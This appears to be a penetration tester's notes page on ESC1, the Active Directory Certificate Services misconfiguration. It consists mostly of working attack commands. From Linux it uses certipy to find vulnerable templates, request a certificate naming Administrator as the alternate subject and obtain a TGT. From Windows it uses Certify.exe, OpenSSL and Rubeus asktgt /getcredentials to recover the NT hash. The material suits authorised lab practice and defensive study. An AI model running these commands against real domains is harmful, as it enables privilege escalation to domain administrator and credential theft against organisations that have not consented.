# ESC1

> ***Active Directory Certificate Services***

------

Vulernability lies in the possibility to specify an alternate user in the certificate request. If the certificate templates allows including a `subjectAltName` (`SAN`) from another use than from the user making the ceritificate request, we can use any user here.

```bash
# Find vulnerabilities
certipy-ad find -u 'zen@lab.local' -p 'Password123!' -dc-ip 10.129.228.236 -vulnerable -stdout

# Showing
[!] Vulnerabilities
      ESC1                              : 'LAB.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication 
```

### ESC1 from Linux

To abuse the ESC1 template we can use certipy to request a Certificate and include a alternate subject. This is done with `req` and `-upn Administrator` (or any other user.&#x20;

```bash
certipy req -u 'zen@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -ca lab-LAB-DC-CA -template ESC1 -upn Administrator
```

**Authenticate with certificate and get a TGT**.

```bash
certipy auth -pfx administrator.pfx -username administrator -domain lab.local -dc-ip 10.129.205.199
```



## ESC1 Abuse from Windows

**Enumeration with Certify.exe**

```powershell
# Certify
.\Certify.exe find /vulnerable

# ADCS Enumeration
Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local'
```

**Convert certificate and get NT hash**

```powershell
# Request wilt alternate SAN
.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:ESC1 /altname:administrator@lab.local

# With OpenSSL convert certificate to pfx from cert.pem
.& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Authenticate with certificate
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /nowrap
```

### Concluding

The ESC 1 misconfiguration is specifying an alternate user in the certificate request by alloowing to including a `subjectAltName` (`SAN)` .&#x20;

**What makes it vulnerable to ESC1?**

| Object                        | Value                        |
| ----------------------------- | ---------------------------- |
| Enrollment Rights             | Like: LAB.LOCAL\Domain Users |
| Requires Manager approval     | False                        |
| Authorized Signature Required | 0                            |

> An other group than domain users may have enrollment rights which we could me member of.
>

Request certificate with different UPN, then authenticate with the .pfx file giving a NT hash and a TGT.
